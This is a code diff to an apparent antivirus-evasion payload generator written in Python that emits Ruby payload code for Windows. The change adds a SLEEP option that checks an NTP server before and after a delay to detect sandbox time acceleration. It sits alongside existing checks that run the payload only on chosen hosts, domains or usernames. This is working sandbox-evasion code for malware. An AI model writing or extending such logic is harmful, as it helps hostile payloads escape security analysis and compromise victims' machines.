@@ -41,7 +41,8 @@ class PayloadModule:
             "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
             "HOSTNAME"       : ["X", "Optional: Only run on specified hostname"],
             "DOMAIN"         : ["X", "Optional: Required internal domain"],
-            "USERNAME"       : ["X", "Optional: The required user account"]
+            "USERNAME"       : ["X", "Optional: The required user account"],
+            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
         }
 
     def generate(self):
@@ -54,7 +55,7 @@ class PayloadModule:
         payload_code += "require 'rubygems';require 'win32/api';require 'net/http';include Win32\n"
         # Add logic for adding this line, stupid bug and I have no idea
         # why this is even a problem, but ruby is dumb
-        if self.required_options["EXPIRE_PAYLOAD"][0] != "X" or self.required_options["HOSTNAME"][0] != "X" or self.required_options["DOMAIN"][0] != "X" or self.required_options["USERNAME"][0] != "X":
+        if self.required_options["EXPIRE_PAYLOAD"][0] != "X" or self.required_options["HOSTNAME"][0] != "X" or self.required_options["DOMAIN"][0] != "X" or self.required_options["USERNAME"][0] != "X" or self.required_options["SLEEP"][0] != "X":
             pass
         else:
             payload_code += "exit if Object.const_defined?(:Ocra)\n"
@@ -95,6 +96,19 @@ class PayloadModule:
 
             payload_code += 'name = ENV["USERNAME"].downcase\n'
             payload_code += 'if name[\"' + self.required_options["USERNAME"][0].lower() + '\"]\n'
+
+            # Add a tab for this check
+            num_ends_required += 1
+
+        if self.required_options["SLEEP"][0].lower() != "x":
+
+            payload_code += 'require \'socket\'\n'
+            payload_code += 'ntp_msg = (["00011011"] + Array.new(47,1)).pack("B8 C47")\n'
+            payload_code += 'sock = UDPSocket.new;sock.connect("us.pool.ntp.org", 123);sock.print ntp_msg;sock.flush;data,_ = sock.recvfrom(960);sock.close\n'
+            payload_code += 'firstTime = Time.at(data.unpack("B319 B32 B32")[1].to_i(2) - 2208988800)\n'
+            payload_code += 'sleep(' + self.required_options["SLEEP"][0] + ')\n'
+            payload_code += 'sock = UDPSocket.new;sock.connect("us.pool.ntp.org", 123);sock.print ntp_msg;sock.flush;data,_ = sock.recvfrom(960)\n'
+            payload_code += 'if (Time.at(data.unpack("B319 B32 B32")[1].to_i(2) - 2208988800) - firstTime >= ' + self.required_options["SLEEP"][0] + ')\n'
 
             # Add a tab for this check
             num_ends_required += 1
